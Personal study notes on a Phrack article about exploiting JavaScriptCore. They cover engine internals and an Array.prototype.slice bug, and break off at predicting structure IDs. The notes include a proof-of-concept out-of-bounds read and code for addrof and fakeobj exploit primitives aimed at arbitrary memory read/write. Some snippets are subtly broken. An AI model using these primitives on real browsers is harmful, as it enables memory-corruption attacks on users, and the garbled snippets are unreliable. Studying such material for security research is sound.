# Notes from [phrack magazine](http://www.phrack.org/papers/attacking_javascript_engines.html)

JavaScript engine contains at least: 
- a compiler infrastructure. at least one just-in-time compiler
- a virtual machine that operates on JS values 
- a runtime that provides a set of builtin objects and functions

# VM, Values & NaN-boxing
The virtual machine contains an interpreter which can directly execute the emitted bytecode. The VM is often implemented as stack-based machine and
thus operated around a stack of values.

Often the first stage JIT compiler takes care of removing some of the dispatching overhead of the interpreter while higher stage JIT compilers perform
sophisticated optimizations, similar to the ahead-of-time compilers we are used to. 

JS is a dynamically typed language, type info is associated with runtime rather than compile-time variables. 

JS has the following primitive types:
- number
- string
- boolean
- null
- undefined 
- symbol

Objects
- arrays
- functions

All major JS engines represent a value a value with no more than 8 bytes forperfomance reasons (fast copying, fits into a register on 64-bit archs).
JSC(JavaScript Core) & SpiderMonkey use a concept called NaN-Boxing. NaN-Boxing makes use of the fact that there exist multiple bit patterns which all
represent NaN, so other values can be encoded in these. Specifically, ever IEE 754 floating point value with all exponent bits set, but a fraction not
equal to zero represents NaN. For double precision values this leaves us with 2^51 different bits of patterns. Thats enough to encode both 32-bit ints
and pointers, since even on 64-bit platforms only 48 bits are currently used for addressing 

# Objects and Arrays

*Objects* in JS are esentially collections of properties which are stores as key, value pairs. Properties can be accessed either with the dot operator
or through square brackers. At least in theory, values used as keys are converted to strings before performing the lookup.
```js
// create an object and assign key:value pairs
var obj = {}; // object creation
obj.name = "nerdy amigo" // create a key value pair
// access the property name
console.log(obj.name)
// "nerdy amigo"
console.log(obj["name"])
// "nerdy amigo"
```

*Arrays* are described by the specs as special objects whose props are also called elements if the property name can be represented by a 32-bit
integer. Most engines today extend this notion to all objects. An array then becomes an object with a special 'length' property whose value is always
equal to the index of the highest element plus one. The net result of all this is that every object has both properties, accesed through a string or
symbol key, and elements accessed through int indices.
```js
// create an array with some data
var arr = [1,2,3,4,5]
// access data using indices
console.log(arr[0])
// 1
```

Internally, JSC stores both properties and elements in the same memory region and stores a pointer to that region in the object itself. This pointer
points to the middle of the region, properties are stored to the left of it(lower addressed) and elements to the right. There is also a small header
located just before the pointed to address that contains the length of the element vector. This concept is called a "Butterfly" since the values
expand to the left and right, similar to the wings of a butterfly. Presumably. 

# Functions

When executing a function's body, two special variables become available. One of them *'arguments'* provides access to the arguments and caller of the function, thus enabling the creation of a function with a varible number of arguments. The other variable *'this'* refers to different objects depending on the invocation of the function.

- If the function was called using a constructor (using 'new func()'), then *'this'* points to the newly created object. Its proto has already been set to the `.prototype` prop of the func object, which is set to the a new object during function definition. 
- If the function was called as a method of the same object (using 'obj.func()'), then *'this'* will point to the reference object. 
- Else *'this'* simply points to the current global object, as it does outside of a function as well. 

Since function are first class objects in JS they too can have props. Two interesting props of functions are `.call` and `.apply` which allow calling the function with a given *'this'* object and args. This can for example be used to implement decorator functionality: 
```js
function decorate(func) {
	return function() {
		for(var i=0;i < arguments.length; i++) {
			// do something with each arg
		}
		return func.apply(this.arguments);
	};
}
```
This also has some implications on the implementations of JS functions inside the engine as they cannot make any assumptions about the value of the reference object which they are called with, as it can be set to arbitrary values from script. Thus, all internal JS functions will need to check the type of not only their args but also of the *'this'* object.

Internally, the built-in function and methods are usually implemented in one of two ways; as native functions in C++ of in JS itself. 

# The bug
The bug in question lies in the implementation of Array.prototype.slice. The native function arrayProtoFuncSlice, located in ArrayPrototype.cpp, is invoked whenever the slice method is called in JS
```js
// slice
var a = [1,2,3, 4]
var s = a.slice(1,3)
// s now contains [2,3]
```
Internally this is how slice is implemented from a high-level perspective

1. Obtain the ref object for the method call
2. Retrieve the length of the array
3. Convert the args into native int types and clamp them to the range
4. Check if the species constructor should be used 
5. Perform the slicing 

The last step is done in one of two ways:
- If the array is a native array with dense storage 'fastSlice' will be used which just `memcpy's` the values into the new array using the given index
  and length. If the fast path is not possible, a simple for-loop is used to fetch each element and add it to the new array. Note that, in contrast to
the property accessors used on the slow path, `fastSlice` does *not* perform any additional bounds checking.

Looking at the code, it is easy to assume that the varible `begin` and `end` would be smaller than the size of the array after they had converted to
native ints. However we can violate that assumption by abusing JS type conversion rules

# JS conversion rules 
JS is inherently weakly typed, meaning it will happily convert values of different types into the type it currently requires. Consider `Math.abs()`
which return the absolute value of the arg. All of the following are "valid" invocations, meaning they will not raise an exception: 
```js
Math.abs(-42); // argument is a num
// 42
Math.abs("-42") // argument is a string
// 42
Math.abs([])	// argument is an empty array 
// 0
Math.abs(true)	// argument is a boolean
// 1
Math.abs({})	// argument is an object
// NaN
```
In contrast, strongly type langs such as python will usually raise an exception if i.e a string is passed to `abs()`

The rules governing the conversion from object types to numbers are specialy interestin. In particular, if the object has a called propery named
`valueOf`, this method will be called and the retuend value used if its a primitive value. And thus
```js
Math.abs({valueOf: function() {return -42}})
//42
```

# Exploiting with `valueOf`

In the case of `arrayProtoFuncSlice` the conversion to a primitive type is performed in `argumentClampedIndexFromStartOrEnd`. This method also clamps the argument to the range [0, length]:
```c++
JSValue value = exec->argument(argument);
if (value.isUndefiend())
	return undefinedValue;
double indexDouble = value.toInteger(exec); // conversion happens here
if (indexDouble < 0) {
	indexDouble += length;
	return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
}
return indexDouble > length ? length : static_cast<unsigned>(indexDouble);
```

If we modify the length of the array inside a `valueOf` func of one of the previous args, then the implementation of slice will continue to use the previous length, resulting in an out-of-bounds access during the `memcpy`. 

Before doing this however, we have to make sure that the element storage is actually resized if we shrink the array. For that let's have a quick look at the implementation of the `.length` setter. From `JSArray::newLength`:
```c++
unsigned lengthToClear = butterfly->publicLength() - newLength; 
unsigned costToAllocateNewButterfly = 64 // a hueristic
if (lengthToClear > newLength && lengthToClear > costToAllocateNewButterfly) {
	reallocateAndShrinkButterfly(exec->vm(), newLength);
	return true;
}
```
This code implements a simple heuristic to avoid realocating the array too often. To force a realocation of our array we will thus need the new size to be much less then the old size. Resizing from e.g. 100 elements to 0 will do the trick.

Here is how we can exploit `Array.prototype.slice`:
```js
var a = [];
for (var i=0; i < 100; i++) {
	a.push(i + 0.123);
}
var b = a.slice(0, {valueOf: function() { a.length = 0; return 10;}})
// b = [0.123,1.123,2.12199579146e-313,0,0,,0,0,0,0]
```
The correct output would have been an array of size 10 filled 'undefined' values since the array has been declared propr to the slice op. However, we can see some float values in the array. Seems like we've read some stuff past the end of the array elements. 

# Reflection 
This particular programming mistake is not new and has been exploited for a while now. The core problem here is (mutable) state that is "cached" in a stack frame in combination with various callback mechanisms that can execute user supplied code further down in the call stack(in this case `valueOf`). With this setting it is quite easy to make false assumptions about the state of the engine throughout a function. The same kind of problem appears in the `DOM` as well due to various event callbacks.

# JSC Heap
At this point we have read data past our array but do not quite know what we are accesing there. To understand this, somne backgrounf knowledge about the JSC heap is required.

# Garbage collector basics
JS is a garbage collected language, meaning the programmer does not need to care about memory management. Instead, the garbage collector will collect unreachable objects from time to time.

One approach to garbage collection is reference counting, which is used extensively in many applications. However, as of today, all major JS engines instead use a mark and sweep algo. Here the collector regularly scans all alive objects, starting from a set of root nodes, and afterwards frees all dead objects. The root nodes are usually pointers located on the stack as well as global objects like the 'window' object in a web browser context. 

There are various distinctions between garbage collection sytems. We will now discull key properties of garbage collection systems which should help the reader understanbd some of the related code.

JSC uses a conservative garbage collector. In essense, this means the GC does not keep track of the root nodes itself. Instead, during GC it will scan the stack for any value that could be a pointer into the heap and treat those as root nodes. In contrast e.g. `SpiderMonkey` uses a precise GC and thus needs to wrap all references to heap objects on the stack inside pointer class`(Rooted<>)` that takes care of registering the object with the GC.

JSC uses an incremental GC. This kind if GC performs the marking in several steps and allows the app to run in between, reducing GC latency. However, this requires sonme additional effort to work correctly. Consider this:
- The GC runs and visits some object 0 and all of its referenced objects. It marks them as visited and kater pauses so the application can run again.
- 0 is modified and a new reference to another Object P is added to it,
- Then the GC runs again but it doesn't know about P. It finished the marking phase and frees the memory of P.

To avoid this scenario, so called write barriers are inserted into the engine. These take care of notifying the GC in such a scenario. These barriers are implemented in JSC with the `WriteBarrier<>` and `CopyBarrier<>` classes. 

Lastly, JSC uses both, a moving and non-moving garbage collector. A moving garbage collector moves live objects to a different location and updates all pointers to these objects. This optimizes for the case of many dead objects since there is no runtime overhead for these: instead of adding them to a free list, the whole memory region is sinmply declared free, JSC stores the JavaScript objects itself, together with a few other objects, inside a non-moving heap, the marked space, while storing the butterflies and other arrays inside a moving heap, the copied space.

# Marked space
The marked space is a collection of memory blocks that keep track of the allocated cells. In JSC, every object allocated in marked space must inherit from the JSCell class and this starts with an eight bytre header, which, among other fields, contains the current cell state as used by the GC. This field is used by the collector to keep track of the cells that it has already visited. 

There is another thing worth mentioning about marked space: JSC stored a `MarkedBlock` instance at the beginning of each marked block:
```c++
inline MarkedBlock* MarkedBlock::blockFor(const void* p)
{
	return reinterpret_cast<MarkedBlock*>(
		reinterpret_cast<Bits>(p) & blockMask;)
}
```
This instance contains among other things a pointer to the owning `heap` and `vm` instance which allows the engine to obtain these if they are not available in the current context. This makes it more difficult to set up fake objects, as a valid `MarkedBlock` instance might be required when performing certain ops. It is this desirable to create fake objects inside a valid marked block if possible.

# Copied space
The copied space stores memory buffers that are associated with some object inside the marked space. These are mostly butterflies, but the contents of types arrays may also be located here. As such, our out-of-bounds access happens in this memory region.
```c++
// the copied allocator
CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)
{
	ASSERT(is8ByteAligned(reinterpret_cast<void*>(bytes)));
	size_t currentRemaining = m_currentRemaining;
	if (bytes > currentRemaining)
		return false;
	currentRemaining -= bytes;
	m_currentRemaining = currentRemaining; 
	*out = m_currentPayloadEnd - currentRemaining - bytes;

	Assert(is8BytesAligned(*out));
	return true;
}
```
This is essentially a bump allocator: it will return the next N bytes of memory in he current block until the block is completely used. Thus it is almost huranteed that two following allocations will be placed adjacent to each other in memory. 
This is good news for us, if we allocate two arrays with one element each, then the two butterflies will be next to each other in virtually every case.

# Building exploit primitives
While the bug in question looks like an out-of-bound read at first, it is actually a more powerful primitive as it lets us `inject` JSValues of our choosing into the newly created JavaScript arrays, and thus into the engine.

We will now create contruct two exploit primitives from the given bug, allowing us to:
1. leak address if an arbitrary JS object
2. inject a fake JS object into the engine

We will call these primitives `addrof` & `fakeobj`.

# Prerequisites: Int64
As we have previously seen, our eexploit primitive currently returns floating point values instead if ints. In fact, at least in theory, all numbers in JS are 64bit floating point numbers. In reality as already mentioned, most engines have a dedicated 32bit int type for performance reasons, but convert to floating point values when neccessary. It is thus not possible to represent arbitrary 64-bit ints with primitive numbers in JS

As such a helper module had to be built which allowed storing 64bit int instances, it supports:
- Initialization of int64 instances from different argument types: strings, numbers and byte arrays
- Assigning the result of addition and subtraction to an existing instance through the `assignXXX` menthods. Using these methods avoids further heap allocations which might br desirable at times.
- Creating new instances that store the result of an addition or subtraction trough the Add and Sub functions
- Converting between doubles, JSValues and Int64 instances such that the underlying bit pattern stays the same.

The last point deserves further discussing. As we have seen above we obtain a double whose underlying memory interpreted as native interger is our desired address. We thus need to convert between native doubles and our ints such that the underlying bits stay the same. `asDouble()` can be thought of as running the following `C` code: 
```c
double asDouble(uint64_t num)
{
	return *(double*)&num;
}
```

The asJSValue method further respects the NaN-boxing procedure and produces a JSValue with the given bit pattern

# addrof & fakeobj
Both primitives rely on the fact that JSC stores arrays in doubles in native representation as opposed to the NaN-boxed representation. This essentially allows us to write native doubles(indexing type ArrayWithDoubles) but have the engine treat them as JSValues and vice versa.
So here are the steps required for exploting the address leak:
1. Create an array of doubles. This will be stored internally as IndexingType and ArrayWithDouble
2. Set up an object with a custom `valueOf` function which will:
	- Shrink the previoulsy created array
	- Allocate a new containing just the object whose address we wish to know. This array will most likely be placed right behind the new butterfly since it's located in the copied space
	- Return a value larger than the new size of the array to trigger the bug
3. Call `slice()` on the target array the object from step 2 as one of the argumnets.

We will now find the desired address in thre form of a 64-bit floating point value inside the array. This works because `slice()` preserves the indexing type. Our new array will thus treat the data as native doubles as well, allowing us to leak arbitrary JSValues instances, and this pointers.

The `fakeobj` primitive works essentially the other way around. Here we inject native doubles into an array of JSValues, allowing us to create JSObject pointer:
1. Create an array of objects. This will not be storted internally as `IndexingTypeArrayWithContiguous`
2. Set up an object with a custom `valueOf` function which will:
	- shrink the previously created array
	- allocate a new array containing just a double whose bit pattern matches the address of the JSObject we wish to inject. The `IndexingType` will be `ArrayWithDouble`
	- return a value larger than the new size of the array to trigger the bug
3. Call `slice()` on the target array the object from step 2 as one of the args.
```js
// both implementations
function addrof(object) {
	var a = []; 
	for (var i = 0; i < 100; i++) {
		a.push(i + 0.1337); //Array must be of type ArrayWithDoubles

		var hax = {valueOf: function() {
			a.length = 0;
			a = [object]; 
			return 4; 
		}}
		var b = a.slice(0, hax);
		return Int64.fromDouble(b[3]);
	}
}

function fakeobj(addr) {
	var a = [];
	for (var i=0; i <100; i++) {
		a.push({}); //Array must be type ArrayWithContiguous 
	addr.addr.asDouble();
	var hax = {valueOf: function() {
		a.length = 0;
		a = [addr];
		return 4;
	}}
	return a.slice(0, hax)[3];
}
```

# Plan of eplxoitation
From here on our goal will be to obtain an arbitrary memory read/write primitive through a fake JS object. We are faced with the following:
- What kind of object do we want to fake?
- How do we fake such an object
- When do we place the faked object so that we know its address?

For a while now, JS engines have supported typed arrays, and effienct and higly optimizable storage for raw binary data. These turn out to be good condidates for our fake object as they are mutable and this controlling their data pointer yields an arbitrary read/write primitive usable from script. Ultimately our goal will now be to fake a `Float64Array` instance.

We will now turn to Q2 and Q3, which require another discussion of JSC internals, namely the JSObject stystem.

# Understanding the JSObject system

JS objects are implemented in JSC by a combination of `C++` classes. At the center lies the JSObject class which is itself a JSCell. There are various subclasses JSObject that loosely resemble different JS objects, such as `Array`, `Typed arrays`, or `Proxys`.

We will noe explore the different parts that make up JSObjects inside the JSC engine. 

# Property storage
Properties are the most important aspect of JS objects. We have already seem how properties are stored in the engine: the butterfly. But that is only half the truth. Besides the butterfly, JSObjects can also have inline storage(6 slots by default, but subject to runtime analysis), located right after the object in memory. This can result in a slight performance gain if no butterfly ever needs to be allocated for an object.

The inline storage is interesting to us since we can leak the address of an object, and thus know the address of its inline slots. These make up a good candidate to put place our fake object in. As added bonus, going this way we also avoid any problem that might arise when placing an objexct outside of a marked block as previously discusses. This answers Q3

# JSObject internals
We will start with an example: suppose we run the following piece of JS code:
```js
// suppose we run the following
obj = {'a': 0x1337, 'b': false, 'c': 13.37, 'd': [1,2,3,4]};
/*
    (lldb) x/6gx 0x10cd97c10
    0x10cd97c10: 0x0100150000000136 0x0000000000000000
    0x10cd97c20: 0xffff000000001337 0x0000000000000006
    0x10cd97c30: 0x402bbd70a3d70a3d 0x000000010cdc7e10
*/
```
The first quadword is the JSCell. The second one the `Butterfly` pointer, which is null since all properties are stored inline. Next are the inline JSValues slots fore the 4 properties: and int, false, a double, and a JSObject pointer. If we were to add more props to the obj, a butterfly would at some point be allocated to store these.

What does a JSCell contain? JSCell.h revelas:

- `StructureID m_structureID;`
	- This si the most interesting one.
- `IndexingType m_indexingType;`
	- We have already seen this before. It indicates the storage mode of the object elements.
- `JStype m_type;`
	- Stores the type of this cell: string, symbol, function, plain obj...
- `TypeInfo::InlineTypeFlags m_flags`;
	- Flags that are not too important for our purposes. `JSTypeInfo.h` contains further info
- `CellState m_cellstate`;
	- We have also seen this before. IT is used by the garbage collector during collection.

# Structures 

JSC creates meta-objects which describe the structure, or layout, of JS object. These objects represent mappings from prop names to indices into the inline storage or the butterfly. In its most basic form, such a structure could be an array of <property name, slot index> pairs. It could also be implemented as a linked list or a hash map. Instead of storing a pointer to this structure in every JSCell instance, the developers instead decided to store a 32-bit index into a structure table to save some space for other fields.

So what happens when a new property is added to an object? If this happens for the first time then a new `Structure` instance will be allocated, containing the previous slot indices for all existing properties and an additional one for the new property. The property would then be stored at the corresponding index, possibly requiring a reallocation of the  butterfly. To avoid repeating this process, the resulting structure instance can be cached in the previous structure, in a data structure caled transition table. The original structure might also be adjusted to allocate more inline or butterfly storage up front to avoid the reallocation. This mechanism ultimately makes structures reusable. 

# Exploitation

Now that we know a bit more about the internals og the JSObject class, lets get back to creating our own `Float64Array` instance which will provide us with an arbitrary memory read/write primitive. Clearly, the most important part will be the structure ID in the JSCell header, as the associated structure instance is what makes our piece of memory "look like" a `Float64Array` to the engine. We thus need to know the ID of a `Float64Array` structure in the structure table.

# Predicting structure IDs



